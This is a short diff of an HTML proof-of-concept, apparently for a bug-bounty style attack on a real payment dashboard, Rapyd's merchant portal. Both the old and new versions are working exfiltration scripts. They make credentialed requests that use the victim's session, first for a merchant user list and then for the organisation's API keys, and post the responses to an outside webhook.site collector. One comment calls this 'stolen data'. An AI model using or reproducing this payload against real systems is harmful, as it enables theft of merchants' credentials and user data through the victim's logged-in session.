@@ -1,17 +1,14 @@
-<!DOCTYPE html>
-<html>
-  <body>
-    <script>
-      fetch("https://dashboard.rapyd.net/v1/merchants-portal/list/users", {
-        credentials: "include"
-      })
-      .then(res => res.text())
-      .then(data => {
-  // Send the stolen data to your webhook
-  fetch("https://webhook.site/57d05575-394e-4d7f-b280-b805ce1da79e", {
-    method: "POST",
-    body: JSON.stringify({ stolen_data: data }),
-    headers: { "Content-Type": "application/json" }
+<script>
+  fetch("https://dashboard.rapyd.net/v1/merchants-portal/organization/api-keys", {
+    method: "GET",
+    credentials: "include"
+  })
+  .then(res => res.text())
+  .then(data => {
+    fetch("https://webhook.site/57d05575-394e-4d7f-b280-b805ce1da79e", {
+      method: "POST",
+      mode: "no-cors",
+      body: data
+    });
   });
-});
 </script>
